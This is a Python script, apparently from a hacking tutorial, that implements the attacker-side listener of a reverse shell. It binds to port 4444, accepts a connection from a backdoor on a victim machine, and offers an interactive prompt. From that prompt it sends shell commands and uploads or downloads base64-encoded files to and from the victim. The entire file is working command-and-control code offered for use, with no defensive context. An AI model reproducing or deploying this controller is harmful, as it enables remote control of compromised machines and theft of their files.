#!/usr/bin/env python

import socket
import json
import base64
class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        self.connection, adress = listener.accept()
        print("[+]Got connection from ", adress)

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute(self, command):
        self.send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.receive()

    def write_file(self, path, content):
        file = open(path, "wb")
        file.write(base64.b64decode(content))
        return "[+] Download Successful"
    def read_file(self, path):
        file = open(path, "rb")
        return base64.b64encode(file.read())


    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute(command)
                if command[0] == "download":
                    result = self.write_file(command[1], result)
                    
                print(result)
            except Exception:
                return "[-] During Execution"

my_listener = Listener("192.168.0.1", 4444)
my_listener.run()


